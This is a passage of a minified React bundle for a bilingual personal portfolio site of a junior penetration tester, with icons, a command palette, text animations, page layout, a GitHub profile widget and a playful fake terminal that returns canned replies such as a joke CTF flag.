ia(){return(0,A.jsxs)(Ki,{children:[(0,A.jsx)(`circle`,{cx:`8`,cy:`3.2`,r:`1.7`}),(0,A.jsx)(`circle`,{cx:`3.4`,cy:`12.6`,r:`1.7`}),(0,A.jsx)(`circle`,{cx:`12.6`,cy:`12.6`,r:`1.7`}),(0,A.jsx)(`path`,{d:`M8 4.9v2.3M8 7.2l-4 3.8M8 7.2l4 3.8`})]})}function aa({size:e=14,className:t=``}){return(0,A.jsx)(`svg`,{width:e,height:e,viewBox:`0 0 24 24`,fill:`currentColor`,className:t,"aria-hidden":`true`,children:(0,A.jsx)(`path`,{d:`M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.901-1.801`})})}function oa({size:e=14,className:t=``}){return(0,A.jsx)(`svg`,{width:e,height:e,viewBox:`0 0 24 24`,fill:`currentColor`,className:t,"aria-hidden":`true`,children:(0,A.jsx)(`path`,{d:`M12.504 0c-.147 0-.292.008-.436.023-3.088.33-4.95 2.766-4.996 5.922l-.008.527c0 .484-.047 1.258-.098 1.723l-.039.355-.355.039c-.586.066-1.145.227-1.664.484-1.258.621-2.074 1.762-2.246 3.137-.145 1.156.195 2.383.93 3.359.359.48.828.875 1.391 1.172l.332.176-.117.352c-.391 1.172-.488 2.508-.281 3.867.273 1.797 1.188 3.203 2.578 3.965.805.441 1.715.688 2.707.734.25.012.504.016.762.016 1.488 0 2.941-.355 4.195-1.027 1.434-.77 2.379-2.027 2.668-3.539.227-1.188.137-2.398-.266-3.504l-.129-.355.344-.16c.559-.262 1.031-.629 1.398-1.074.789-.961 1.164-2.188 1.027-3.371-.164-1.402-1.008-2.582-2.316-3.23-.516-.254-1.074-.41-1.66-.469l-.352-.035-.043-.355c-.059-.488-.109-1.293-.109-1.785l-.008-.527C17.512 2.75 15.637.316 12.504 0zm-.176 1.996c2.094.027 3.277 1.637 3.277 4.098v.648c0 .77.07 1.895.168 2.637.332.07.652.176.957.324.75.371 1.223 1.027 1.316 1.824.078.699-.133 1.41-.59 1.977-.258.316-.598.57-1.004.758-.512.238-.859.715-.898 1.277-.078.961.016 1.961-.277 2.883-.223.703-.699 1.309-1.379 1.758-.949.625-2.09.898-3.211.777-.879-.094-1.688-.445-2.277-.992-.613-.574-.969-1.344-1.031-2.227-.082-1.156.129-2.289-.188-3.414-.148-.523-.551-.926-1.074-1.07-.375-.102-.719-.281-.996-.531-.5-.453-.781-1.102-.773-1.781.012-.828.484-1.555 1.25-1.922.336-.16.703-.266 1.082-.316.109-.738.188-1.859.188-2.625v-.648c0-2.465 1.18-4.07 3.273-4.098z`})})}function sa({isOpen:e,onClose:t}){let{lang:n,tr:r,toggle:i}=ar(),a=_t(),[o,s]=(0,u.useState)(``),[c,l]=(0,u.useState)(0),d=(0,u.useRef)(null),f=n===`es`,p=(0,u.useMemo)(()=>{let e=[];return hr.forEach(n=>{e.push({type:`page`,category:f?`Navegación`:`Navigation`,title:r(n.label),subtitle:n.path,icon:n.icon||`terminal`,action:()=>{a(n.path),t()}})}),Ni.forEach(n=>{let i=r(n.title);e.push({type:`doc-cat`,category:f?`Pentesting: Sección`:`Pentesting: Category`,title:i,subtitle:`/pentesting/${n.slug}`,icon:n.icon||`book`,action:()=>{a(`/pentesting/${n.slug}`),t()}}),n.pages?.forEach(r=>{e.push({type:`doc-page`,category:`Pentesting: ${i}`,title:r.title,subtitle:`/pentesting/${n.slug}/${r.slug}`,icon:`document`,action:()=>{a(r.external||`/pentesting/${n.slug}/${r.slug}`),t()}})})}),e.push({type:`doc-page`,category:`Pentesting: Active Directory`,title:f?`Mapa de Ataques de Active Directory`:`Active Directory Attack Map`,subtitle:`/pentesting/active-directory/mapa-de-ataques`,icon:`network`,action:()=>{a(`/pentesting/active-directory/mapa-de-ataques`),t()}}),ur.forEach(n=>{e.push({type:`project`,category:f?`Proyectos`:`Projects`,title:n.title,subtitle:r(n.desc),icon:`briefcase`,action:()=>{a(`/projects`),t()}})}),dr.forEach(n=>{e.push({type:`cert`,category:f?`Certificaciones`:`Certifications`,title:`${n.name} — ${n.full}`,subtitle:`${n.issuer} (${r({es:n.score,en:n.score})})`,icon:`target`,action:()=>{a(`/achievements`),t()}})}),mr.forEach(n=>{e.push({type:`writeup`,category:`Writeups`,title:`${n.platform} — ${n.title}`,subtitle:r(n.summary),icon:`document`,action:()=>{n.url?window.open(n.url,`_blank`,`noopener,noreferrer`):n.path&&a(n.path),t()}})}),e.push({type:`action`,category:f?`Acciones Rápidas`:`Quick Actions`,title:f?`Cambiar Idioma (ES / EN)`:`Toggle Language (ES / EN)`,subtitle:f?`Cambiar a inglés`:`Switch to Spanish`,icon:`globe`,action:()=>{i(),t()}}),e.push({type:`action`,category:f?`Acciones Rápidas`:`Quick Actions`,title:f?`Copiar Email de Alberto`:`Copy Alberto’s Email`,subtitle:sr.email,icon:`mail`,action:()=>{navigator.clipboard.writeText(sr.email),alert(f?`Email copiado: `+sr.email:`Email copied: `+sr.email),t()}}),e.push({type:`action`,category:f?`Acciones Rápidas`:`Quick Actions`,title:`GitHub: bitsofalber`,subtitle:sr.github,icon:`code`,action:()=>{window.open(sr.github,`_blank`,`noopener,noreferrer`),t()}}),e},[n,r,i,a,t,f]),m=(0,u.useMemo)(()=>{if(!o.trim())return p.slice(0,10);let e=o.toLowerCase();return p.filter(t=>t.title.toLowerCase().includes(e)||t.subtitle?.toLowerCase().includes(e)||t.category.toLowerCase().includes(e)).slice(0,15)},[p,o]);return(0,u.useEffect)(()=>{l(0)},[o]),(0,u.useEffect)(()=>{e&&(s(``),l(0),setTimeout(()=>d.current?.focus(),50))},[e]),e?(0,A.jsx)(`div`,{className:`palette-backdrop`,onClick:t,role:`dialog`,"aria-modal":`true`,children:(0,A.jsxs)(`div`,{className:`palette-modal`,onClick:e=>e.stopPropagation(),children:[(0,A.jsxs)(`div`,{className:`palette-search-bar`,children:[(0,A.jsx)(Yi,{}),(0,A.jsx)(`input`,{ref:d,type:`text`,className:`palette-input`,placeholder:f?`Buscar comandos, guías de pentesting, proyectos...`:`Search commands, pentesting guides, projects...`,value:o,onChange:e=>s(e.target.value),onKeyDown:e=>{e.key===`Escape`?(e.preventDefault(),t()):e.key===`ArrowDown`?(e.preventDefault(),l(e=>(e+1)%Math.max(1,m.length))):e.key===`ArrowUp`?(e.preventDefault(),l(e=>(e-1+m.length)%Math.max(1,m.length))):e.key===`Enter`&&(e.preventDefault(),m[c]&&m[c].action())}}),(0,A.jsx)(`kbd`,{className:`palette-esc`,onClick:t,children:`ESC`})]}),(0,A.jsx)(`div`,{className:`palette-results`,children:m.length===0?(0,A.jsx)(`div`,{className:`palette-empty`,children:f?`No se encontraron resultados para "`+o+`"`:`No results found for "`+o+`"`}):m.map((e,t)=>(0,A.jsxs)(`div`,{className:`palette-item${t===c?` active`:``}`,onClick:()=>e.action(),onMouseEnter:()=>l(t),children:[(0,A.jsx)(`div`,{className:`palette-item-icon`,children:(0,A.jsx)(`span`,{className:`palette-dot`})}),(0,A.jsxs)(`div`,{className:`palette-item-info`,children:[(0,A.jsx)(`div`,{className:`palette-item-title`,children:e.title}),(0,A.jsxs)(`div`,{className:`palette-item-sub`,children:[(0,A.jsx)(`span`,{className:`palette-tag`,children:e.category}),e.subtitle&&(0,A.jsx)(`span`,{className:`palette-text`,children:e.subtitle})]})]}),(0,A.jsx)(`span`,{className:`palette-enter`,"aria-hidden":`true`,children:`↵`})]},`${e.type}-${e.title}-${t}`))}),(0,A.jsxs)(`div`,{className:`palette-footer`,children:[(0,A.jsxs)(`span`,{children:[(0,A.jsx)(`kbd`,{children:`↑`}),` `,(0,A.jsx)(`kbd`,{children:`↓`}),` `,f?`Navegar`:`Navigate`]}),(0,A.jsxs)(`span`,{children:[(0,A.jsx)(`kbd`,{children:`↵`}),` `,f?`Seleccionar`:`Select`]}),(0,A.jsxs)(`span`,{children:[(0,A.jsx)(`kbd`,{children:`ESC`}),` `,f?`Cerrar`:`Close`]})]})]})}):null}function ca({name:e}){switch(e){case`terminal`:return(0,A.jsx)(ea,{});case`book`:return(0,A.jsx)(na,{});case`briefcase`:return(0,A.jsx)(Ri,{});case`target`:return(0,A.jsx)(Bi,{});case`document`:return(0,A.jsx)(M,{});case`user`:return(0,A.jsx)(Li,{});case`mail`:return(0,A.jsx)(Vi,{});case`globe`:return(0,A.jsx)(Qi,{});default:return(0,A.jsx)(ea,{})}}var la=`!<>-_\\/[]{}~=+*^?#0123456789`;function ua({text:e,as:t=`span`,className:n=``,triggerOnHover:r=!0,...i}){let a=(0,u.useRef)(null),o=(0,u.useRef)(null),s=(0,u.useRef)(!1),c=()=>{if(!a.current)return;o.current&&cancelAnimationFrame(o.current),s.current=!0;let t=[];for(let n=0;n<e.length;n++){let r=e[n],i=r===` `,a=i?0:Math.floor(n*1.2),o=i?0:a+9+Math.floor(Math.random()*5);t.push({to:r,isSpace:i,start:a,end:o,char:la[Math.floor(Math.random()*28)]})}let n=0,r=()=>{let e=0,i=``;for(let r=0;r<t.length;r++){let a=t[r];a.isSpace?(i+=` `,e++):n>=a.end?(i+=a.to,e++):(a.char=la[Math.floor(Math.random()*28)],i+=`<span class="scramble-dud">${a.char}</span>`)}a.current&&(a.current.innerHTML=i),e===t.length?s.current=!1:(n++,o.current=requestAnimationFrame(r))};r()};return(0,u.useEffect)(()=>(c(),()=>{o.current&&cancelAnimationFrame(o.current)}),[e]),(0,A.jsx)(t,{ref:a,className:`scramble-text ${n}`,onMouseEnter:()=>{r&&!s.current&&c()},...i,children:e})}function da({firstName:e,lastName:t,handle:n,className:r=``}){let i=(0,u.useRef)(null),a=(0,u.useRef)(null),o=(0,u.useRef)(!1),s=`${e} ${t} [@${n}]`,c=e.length,l=t.length,d=()=>{if(!i.current)return;a.current&&cancelAnimationFrame(a.current),o.current=!0;let e=[];for(let t=0;t<s.length;t++){let n=s[t],r=n===` `,i=r?0:Math.floor(t*1.1),a=r?0:i+9+Math.floor(Math.random()*5);e.push({to:n,isSpace:r,start:i,end:a,char:la[Math.floor(Math.random()*28)]})}let t=0,n=()=>{let r=0,s=``,u=``,d=``;for(let n=0;n<e.length;n++){let i=e[n],a=``;i.isSpace?(a=` `,r++):t>=i.end?(a=i.to,r++):(i.char=la[Math.floor(Math.random()*28)],a=`<span class="scramble-dud">${i.char}</span>`),n<c?s+=a:n===c||(n<c+1+l?u+=a:n===c+1+l||(d+=a))}i.current&&(i.current.innerHTML=`<span class="hero-first">${s}</span> <span class="hero-last">${u}</span> <span class="hero-tag">${d}</span>`),r===e.length?o.current=!1:(t++,a.current=requestAnimationFrame(n))};n()};return(0,u.useEffect)(()=>(d(),()=>{a.current&&cancelAnimationFrame(a.current)}),[e,t,n]),(0,A.jsxs)(`h1`,{ref:i,className:`hero-name ${r}`,onMouseEnter:()=>{o.current||d()},style:{cursor:`default`},title:`${e} ${t} [@${n}]`,children:[(0,A.jsx)(`span`,{className:`hero-first`,children:e}),` `,(0,A.jsx)(`span`,{className:`hero-last`,children:t}),` `,(0,A.jsxs)(`span`,{className:`hero-tag`,children:[`[@`,n,`]`]})]})}function fa(){let{pathname:e}=ht(),{lang:t,tr:n,toggle:r}=ar(),[i,a]=(0,u.useState)(!1),[o,s]=(0,u.useState)(!1),c=t===`es`;(0,u.useEffect)(()=>{window.scrollTo(0,0),a(!1)},[e]),(0,u.useEffect)(()=>{let e=e=>{(e.metaKey||e.ctrlKey)&&e.key.toLowerCase()===`k`&&(e.preventDefault(),s(e=>!e))};return window.addEventListener(`keydown`,e),()=>window.removeEventListener(`keydown`,e)},[]);let l=()=>e===`/`?`home`:e.replace(/^\//,``).replace(/\//g,` / `),d=hr.map(t=>(0,A.jsx)(`li`,{className:`nav-item${e===t.path||t.path!==`/`&&e.startsWith(t.path)?` active`:``}`,style:{"--c":t.color},children:(0,A.jsxs)(zn,{to:t.path,end:t.path===`/`,className:({isActive:e})=>`nav-link${e?` active`:``}`,onClick:()=>a(!1),children:[(0,A.jsx)(`span`,{className:`nav-icon-wrap`,"aria-hidden":`true`,children:(0,A.jsx)(ca,{name:t.icon})}),(0,A.jsx)(`span`,{className:`nav-label`,children:n(t.label)}),(0,A.jsxs)(`span`,{className:`nav-code`,"aria-hidden":`true`,children:[`0x`,t.code]})]})},t.path));return(0,A.jsxs)(`div`,{className:`layout-shell`,children:[(0,A.jsx)(`a`,{className:`skip-link`,href:`#main`,children:`Skip to content`}),(0,A.jsx)(sa,{isOpen:o,onClose:()=>s(!1)}),i&&(0,A.jsx)(`div`,{className:`sidebar-backdrop`,onClick:()=>a(!1),"aria-hidden":`true`}),(0,A.jsxs)(`aside`,{id:`sidebar`,className:`sidebar${i?` mobile-open`:``}`,children:[(0,A.jsx)(or,{opacity:.22}),(0,A.jsxs)(`div`,{className:`sidebar-inner`,children:[(0,A.jsxs)(`header`,{className:`profile-wrapper`,children:[(0,A.jsx)(k,{to:`/`,className:`avatar-link`,"aria-label":`Alberto Hidalgo — Inicio`,children:(0,A.jsxs)(`div`,{id:`avatar`,className:`avatar`,children:[(0,A.jsx)(`div`,{className:`avatar-hex`,children:j.avatarImage?(0,A.jsx)(`img`,{src:j.avatarImage,alt:`${j.firstName} ${j.lastName}`,className:`avatar-img`}):(0,A.jsx)(`span`,{className:`avatar-initials`,children:j.avatarText})}),(0,A.jsx)(`div`,{className:`avatar-radar`,"aria-hidden":`true`})]})}),(0,A.jsx)(`h1`,{className:`site-title`,children:(0,A.jsxs)(k,{to:`/`,children:[(0,A.jsx)(`span`,{className:`name-bold`,children:(0,A.jsx)(ua,{text:`${j.firstName} ${j.lastName}`})}),(0,A.jsx)(`span`,{className:`handle-tag`,children:(0,A.jsx)(ua,{text:`@${j.handle}`})})]})}),(0,A.jsx)(`div`,{className:`site-subtitle`,"aria-live":`polite`,children:(0,A.jsx)(_r,{})}),(0,A.jsxs)(`div`,{className:`status-pill-sidebar`,children:[(0,A.jsx)(`span`,{className:`live-dot`,"aria-hidden":`true`}),(0,A.jsx)(`span`,{children:n(gr.openToWork)})]})]}),(0,A.jsx)(`nav`,{className:`sidebar-nav`,"aria-label":`Main Navigation`,children:(0,A.jsx)(`ul`,{className:`nav-list`,children:d})}),(0,A.jsxs)(`div`,{className:`sidebar-bottom`,children:[(0,A.jsxs)(`div`,{className:`sidebar-socials`,children:[(0,A.jsx)(`a`,{href:sr.github,target:`_blank`,rel:`noopener noreferrer`,"aria-label":`GitHub`,className:`social-btn github`,title:`GitHub: bitsofalber`,children:(0,A.jsx)(Ui,{})}),(0,A.jsx)(`a`,{href:sr.linkedin,target:`_blank`,rel:`noopener noreferrer`,"aria-label":`LinkedIn`,className:`social-btn linkedin`,title:`LinkedIn: Alberto Hidalgo`,children:(0,A.jsx)(Wi,{})}),(0,A.jsx)(`a`,{href:`mailto:${sr.email}`,"aria-label":`Email`,className:`social-btn email`,title:sr.email,children:(0,A.jsx)(Vi,{})})]}),(0,A.jsxs)(`div`,{className:`sidebar-footer-row`,children:[(0,A.jsxs)(`button`,{type:`button`,className:`lang-toggle-btn`,onClick:r,"aria-label":n(gr.switchLang),title:n(gr.switchLang),children:[(0,A.jsx)(`span`,{className:t===`es`?`active-lang`:``,children:`ES`}),(0,A.jsx)(`span`,{className:`lang-sep`,children:`/`}),(0,A.jsx)(`span`,{className:t===`en`?`active-lang`:``,children:`EN`})]}),(0,A.jsx)(`span`,{className:`sidebar-version`,children:`v2.4.0`})]})]})]})]}),(0,A.jsxs)(`div`,{className:`main-shell`,children:[(0,A.jsxs)(`header`,{className:`topbar`,children:[(0,A.jsxs)(`div`,{className:`topbar-left`,children:[(0,A.jsx)(`button`,{type:`button`,className:`mobile-toggle-btn`,onClick:()=>a(e=>!e),"aria-label":n(i?gr.closeMenu:gr.menu),children:i?(0,A.jsx)(Ji,{}):(0,A.jsx)(qi,{})}),(0,A.jsxs)(`div`,{className:`topbar-breadcrumb`,children:[(0,A.jsx)(`span`,{className:`bc-root`,children:`~`}),(0,A.jsx)(`span`,{className:`bc-sep`,children:`/`}),(0,A.jsx)(`span`,{className:`bc-site`,children:`ahidalgo.es`}),(0,A.jsx)(`span`,{className:`bc-sep`,children:`/`}),(0,A.jsx)(`span`,{className:`bc-path`,children:l()})]})]}),(0,A.jsxs)(`div`,{className:`topbar-right`,children:[(0,A.jsxs)(`button`,{type:`button`,className:`topbar-search-trigger`,onClick:()=>s(!0),"aria-label":n(gr.searchPlaceholder),children:[(0,A.jsx)(Yi,{}),(0,A.jsx)(`span`,{className:`search-text`,children:n(gr.searchPlaceholder)}),(0,A.jsx)(`kbd`,{className:`search-shortcut`,children:`⌘K`})]}),(0,A.jsxs)(`div`,{className:`topbar-status`,children:[(0,A.jsx)(`span`,{className:`status-ping`,"aria-hidden":`true`}),(0,A.jsx)(`span`,{className:`status-label`,children:`ONLINE`})]})]})]}),(0,A.jsx)(`main`,{id:`main`,className:`content-container`,children:(0,A.jsx)(u.Suspense,{fallback:(0,A.jsx)(`div`,{className:`content-loading`}),children:(0,A.jsx)(Kt,{})})}),(0,A.jsx)(`footer`,{className:`site-footer`,children:(0,A.jsxs)(`div`,{className:`footer-content`,children:[(0,A.jsxs)(`p`,{className:`footer-copy`,children:[`© `,new Date().getFullYear(),` Alberto Hidalgo (`,(0,A.jsx)(`strong`,{children:j.handle}),`).`,` `,c?`Seguridad Ofensiva & Pentesting.`:`Offensive Security & Pentesting.`]}),(0,A.jsxs)(`p`,{className:`footer-links`,children:[(0,A.jsx)(`a`,{href:sr.github,target:`_blank`,rel:`noopener noreferrer`,children:`GitHub`}),(0,A.jsx)(`span`,{className:`dot-sep`,children:`·`}),(0,A.jsx)(`a`,{href:sr.linkedin,target:`_blank`,rel:`noopener noreferrer`,children:`LinkedIn`}),(0,A.jsx)(`span`,{className:`dot-sep`,children:`·`}),(0,A.jsx)(k,{to:`/contact`,children:c?`Contacto`:`Contact`})]})]})})]})]})}var P=[`BitsOfAlber Security Terminal v2.4 (x86_64-pc-linux-gnu)`,`Type "help" for a list of available commands or click any chip below.`];function pa({className:e=``}){let{tr:t,lang:n}=ar(),r=_t(),i=n===`es`,[a,o]=(0,u.useState)([{type:`system`,text:P.join(`
`)},{type:`cmd`,cmd:`whoami`,output:`${j.firstName} ${j.lastName} [${j.handle}]\nRole: ${t(j.role)}\nLocation: ${t(j.based)}`}]),[s,c]=(0,u.useState)(``),[l,d]=(0,u.useState)([`whoami`]),[f,p]=(0,u.useState)(-1),m=(0,u.useRef)(null),h=(0,u.useRef)(null),g=()=>{m.current&&m.current.scrollIntoView({behavior:`smooth`})};(0,u.useEffect)(()=>{g()},[a]);let _=e=>{let n=e.trim();if(!n)return;d(e=>[n,...e]),p(-1);let a=n.toLowerCase(),s=``;switch(a){case`help`:s=i?`Comandos disponibles:
  whoami        - Información del perfil y rol
  skills        - Resumen de habilidades Red / Blue / Sistemas
  projects      - Proyectos activos (Tech4U Academy, SOC)
  certs         - Certificaciones (eJPTv2, preparación OSCP)
  writeups      - Artículos y máquinas resueltas
  wiki          - Ir a la documentación de Pentesting
  contact       - Medios de contacto directo
  cat flag.txt  - Leer archivo secreto del servidor
  clear         - Limpiar la pantalla del terminal`:`Available commands:
  whoami        - Profile info and role
  skills        - Summary of Red / Blue / Systems skills
  projects      - Active projects (Tech4U Academy, SOC)
  certs         - Certifications (eJPTv2, OSCP prep)
  writeups      - Articles and resolved machines
  wiki          - Go to Pentesting documentation
  contact       - Direct contact channels
  cat flag.txt  - Read secret server file
  clear         - Clear terminal screen`;break;case`whoami`:case`id`:s=`uid=1000(${j.handle.toLowerCase()}) gid=1000(pentesters) groups=1000(pentesters),27(sudo),4(adm)\nName: ${j.firstName} ${j.lastName}\nStatus: Open to Work\nCertifications: eJPTv2 (Verified) | OSCP Candidate\nStudies: ASIR (Administración de Sistemas Informáticos en Red)`;break;case`skills`:s=lr.map(e=>`[${t(e.label)}]\n${e.items.map(e=>`  • ${e.name}`).join(`
`)}`).join(`

`);break;case`projects`:s=ur.map(e=>`▸ ${e.title} [Status: ${e.status.toUpperCase()}]\n  ${t(e.desc)}\n  Tags: ${e.tags.join(`, `)}`).join(`

`);break;case`certs`:case`certifications`:s=dr.map(e=>`★ ${e.name} - ${e.full}\n  Issuer: ${e.issuer} | State: ${e.state.toUpperCase()}${e.verify?`\n  Verify: ${e.verify}`:``}`).join(`

`);break;case`writeups`:s=mr.map(e=>`[${e.platform}] ${e.title} (${e.difficulty.toUpperCase()} / ${e.os.toUpperCase()})\n  ${t(e.summary)}\n  URL: ${e.url}`).join(`

`);break;case`wiki`:case`pentesting`:case`docs`:s=i?`Navegando a /pentesting...`:`Navigating to /pentesting...`,setTimeout(()=>r(`/pentesting`),500);break;case`contact`:s=`Email:    ${sr.email}\nGitHub:   ${sr.github}\nLinkedIn: ${sr.linkedin}`;break;case`cat flag.txt`:case`flag`:s=`[+] FLAG DISCOVERED!
FLAG{b1ts0f4lb3r_3jptv2_0scp_c4nd1d4t3_r00t_2026}
Hint: Great curiosity! Don't hesitate to reach out.`;break;case`sudo su`:case`su`:case`sudo`:s=`[-] Nice try! User '${j.handle.toLowerCase()}' is already in sudoers, but root requires eJPTv2 authorization.`;break;case`clear`:o([]),c(``);return;default:s=i?`zsh: orden no encontrada: ${n}. Escribe 'help' para ver los comandos.`:`zsh: command not found: ${n}. Type 'help' to see valid commands.`}o(e=>[...e,{type:`cmd`,cmd:n,output:s}]),c(``)};return(0,A.jsxs)(`div`,{className:`hx-term ${e}`,onClick:()=>h.current?.focus(),children:[(0,A.jsxs)(`div`,{className:`hx-term-bar`,children:[(0,A.jsxs)(`div`,{className:`hx-term-dots`,"aria-hidden":`true`,children:[(0,A.jsx)(`span`,{className:`hx-dot r`}),(0,A.jsx)(`span`,{className:`hx-dot y`}),(0,A.jsx)(`span`,{className:`hx-dot g`})]}),(0,A.jsx)(`div`,{className:`hx-term-title`,children:(0,A.jsx)(`span`,{children:`bitsofalber@portfolio:~ (zsh)`})}),(0,A.jsx)(`div`,{className:`hx-term-badge`,children:`bash 5.2`})]}),(0,A.jsxs)(`div`,{className:`hx-term-quick`,children:[(0,A.jsx)(`span`,{className:`hx-quick-label`,children:i?`Sugerencias:`:`Quick cmds:`}),(0,A.jsx)(`div`,{className:`hx-quick-chips`,children:[`whoami`,`skills`,`projects`,`certs`,`writeups`,`cat flag.txt`,`help`,`clear`].map(e=>(0,A.jsx)(`button`,{type:`button`,className:`hx-chip`,onClick:t=>{t.stopPropagation(),_(e)},children:e},e))})]}),(0,A.jsxs)(`div`,{className:`hx-term-body`,children:[a.map((e,t)=>(0,A.jsxs)(`div`,{className:`hx-term-entry`,children:[e.type===`system`&&(0,A.jsx)(`pre`,{className:`hx-t-out hx-t-system`,children:e.text}),e.type===`cmd`&&(0,A.jsxs)(A.Fragment,{children:[(0,A.jsxs)(`div`,{className:`hx-t-cmd`,children:[(0,A.jsxs)(`span`,{className:`hx-t-ps1`,children:[(0,A.jsx)(`b`,{children:`bitsofalber@sec-box`}),`:`,(0,A.jsx)(`b`,{children:`~`}),`$ `]}),(0,A.jsx)(`span`,{className:`hx-t-in`,children:e.cmd})]}),e.output&&(0,A.jsx)(`pre`,{className:`hx-t-out`,children:e.output})]})]},t)),(0,A.jsxs)(`div`,{className:`hx-t-cmd hx-t-active`,children:[(0,A.jsxs)(`span`,{className:`hx-t-ps1`,children:[(0,A.jsx)(`b`,{children:`bitsofalber@sec-box`}),`:`,(0,A.jsx)(`b`,{children:`~`}),`$ `]}),(0,A.jsx)(`input`,{ref:h,type:`text`,className:`hx-t-input`,value:s,onChange:e=>c(e.target.value),onKeyDown:e=>{if(e.key===`Enter`)e.preventDefault(),_(s);else if(e.key===`ArrowUp`){if(e.preventDefault(),l.length===0)return;let t=Math.min(f+1,l.length-1);p(t),c(l[t]||``)}else if(e.key===`ArrowDown`)if(e.preventDefault(),f>0){let e=f-1;p(e),c(l[e]||``)}else p(-1),c(``)},spellCheck:`false`,autoComplete:`off`,autoCapitalize:`off`,"aria-label":`Terminal command prompt`})]}),(0,A.jsx)(`div`,{ref:m})]})]})}var ma=`bitsofalber`,ha=300*1e3,ga=[`KrakenSOC-Labs`,`asir-learning-labs`,`bitsofalber.github.io`],_a=e=>!e.fork&&!ga.includes(e.name);function va(){let[e,t]=(0,u.useState)(null),[n,r]=(0,u.useState)([]),[i,a]=(0,u.useState)(!0),[o,s]=(0,u.useState)(null);return(0,u.useEffect)(()=>{let e=`gh_${ma}_v2`,n=sessionStorage.getItem(e);if(n){let{ts:e,user:i,repos:o}=JSON.parse(n);if(Date.now()-e<ha){t(i),r(o),a(!1);return}}Promise.all([fetch(`https://api.github.com/users/${ma}`).then(e=>e.json()),fetch(`https://api.github.com/users/${ma}/repos?sort=updated&per_page=20`).then(e=>e.json())]).then(([n,i])=>{if(n.message)throw Error(n.message);let a=Array.isArray(i)?i.filter(_a).slice(0,6):[];t(n),r(a),sessionStorage.setItem(e,JSON.stringify({ts:Date.now(),user:n,repos:a}))}).catch(e=>s(e.message)).finally(()=>a(!1))},[]),{data:e,repos:n,loading:i,error:o}}function ya({headingless:e=!1}){let{data:t,repos:n,loading:r,error:i}=va(),{t:a,lang:o}=ar(),s=n.reduce((e,t)=>e+t.stargazers_count,0);return(0,A.jsxs)(`div`,{children:[r&&(0,A.jsxs)(`div`,{className:`gh-loading`,children:[(0,A.jsx)(`span`,{className:`gh-dot`}),(0,A.jsx)(`span`,{className:`gh-dot`}),(0,A.jsx)(`span`,{className:`gh-dot`}),(0,A.jsx)(`span`,{style:{marginLeft:`8px`,color:`var(--text-muted)`,fontFamily:`var(--font-mono)`,fontSize:`12px`},children:a(`github.loading`)})]}),i&&(0,A.jsx)(`div`,{style:{fontSize:`13px`,color:`var(--text-muted)`,padding:`12px`},children:a(`github.error`)}),t&&!r&&(0,A.jsxs)(A.Fragment,{children:[(0,A.jsxs)(`div`,{className:`gh-stats`,children:[(0,A.jsxs)(`div`,{className:`gh-stat`,children:[(0,A.jsx)(`div`,{className:`gh-stat-n`,children:t.public_repos}),(0,A.jsx)(`div`,{className:`gh-stat-l`,children:a(`github.repos`)})]}),(0,A.jsxs)(`div`,{className:`gh-stat`,children:[(0,A.jsx)(`div`,{className:`gh-stat-n`,children:t.followers}),(0,A.jsx)(`div`,{className:`gh-stat-l`,children:a(`github.followers`)})]}),(0,A.jsxs)(`div`,{className:`gh-stat`,children:[(0,A.jsx)(`div`,{className:`gh-stat-n`,children:s}),(0,A.jsx)(`div`,{className:`gh-stat-l`,children:a(`github.stars`)})]})]}),(0,A.jsx)(`div`,{className:`gh-repo-list`,children:n.map(e=>(0,A.jsxs)(`a`,{href:e.html_url,target:`_blank`,rel:`noopener noreferrer`,className:`gh-repo`,children:[(0,A.jsxs)(`div`,{className:`gh-repo-info`,children:[(0,A.jsx)(`div`,{className:`gh-repo-name`,children:e.name}),e.description&&(0,A.jsx)(`div`,{className:`gh-repo-desc`,children:e.description})]}),(0,A.jsxs)(`div`,{className:`gh-repo-meta`,children:[e.language&&(0,A.jsx)(`span`,{className:`gh-repo-lang`,children:e.language}),e.stargazers_count>0&&(0,A.jsxs)(`span`,{className:`gh-repo-stars`,children:[`★ `,e.stargazers_count]})]})]},e.id))}),(0,A.jsx)(`a`,{href:`https://github.com/${t.login}`,target:`_blank`,rel:`noopener noreferrer`,className:`gh-view-all`,children:a(`github.viewAll`)})]})]})}function ba(){let{lang:e,tr:t}=ar(),n=e===`es`;return(0,u.useEffect)(()=>{document.title=`${j.firstName} ${j.lastName} (@${j.handle}) — Junior Penetration Tester`},[]),(0,A.jsxs)(`div`,{className:`home-bento-wrapper`,children:[(0,A.jsxs)(`section`,{className:`bento-grid-hero`,children:[(0,A.jsxs)(`div`,{className:`bento-card bento-hero-bio`,children:[(0,A.jsxs)(`div`,{className:`hero-bio-header`,children:[j.avatarImage&&(0,A.jsx)(`img`,{src:j.avatarImage,alt:`${j.firstName} ${j.lastName}`,className:`hero-avatar-photo`,width:`76`,height:`76`}),(0,A.jsxs)(`div`,{className:`hero-bio-title-wrap`,children:[(0,A.jsxs)(`div`,{className:`card-kicker`,children:[(0,A.jsx)(`span`,{className:`dot-radar`,"aria-hidden":`true`}),(0,A.jsx)(`span`,{children:`OFFENSIVE SECURITY & SYSTEM ADMINISTRATION`})]}),(0,A.jsx)(da,{firstName:j.firstName,lastName:j.lastName,handle:j.handle})]})]}),(0,A.jsx)(`p`,{className:`hero-role`,children:t(j.role)}),(0,A.jsx)(`p`,{className:`hero-desc`,children:t(j.tagline)}),(0,A.jsxs)(`div`,{className:`hero-badges`,children:[(0,A.jsxs)(`span`,{className:`tactical-badge cert-badge`,children:[(0,A.jsx)(Bi,{}),` eJPTv2 Certified`]}),(0,A.jsxs)(`span`,{className:`tactical-badge oscp-badge`,children:[(0,A.jsx)(N,{}),` OSCP Candidate`]}),(0,A.jsxs)(`span`,{className:`tactical-badge asir-badge`,children:[(0,A.jsx)(ra,{}),` ASIR Student`]}),(0,A.jsxs)(`span`,{className:`tactical-badge founder-badge`,children:[(0,A.jsx)(ta,{}),` Tech4U Founder`]})]}),(0,A.jsxs)(`div`,{className:`hero-actions`,children:[(0,A.jsxs)(k,{to:`/projects`,className:`hx-btn hx-btn-primary`,children:[(0,A.jsx)(Ri,{}),` `,n?`Explorar Proyectos`:`Explore Projects`]}),(0,A.jsxs)(`a`,{href:`/cv.pdf`,target:`_blank`,rel:`noopener noreferrer`,className:`hx-btn hx-btn-secondary`,title:n?`Descargar Curriculum Vitae en PDF`:`Download CV in PDF`,children:[(0,A.jsx)(M,{}),` `,n?`Descargar CV`:`Download CV`]}),(0,A.jsxs)(k,{to:`/pentesting`,className:`hx-btn 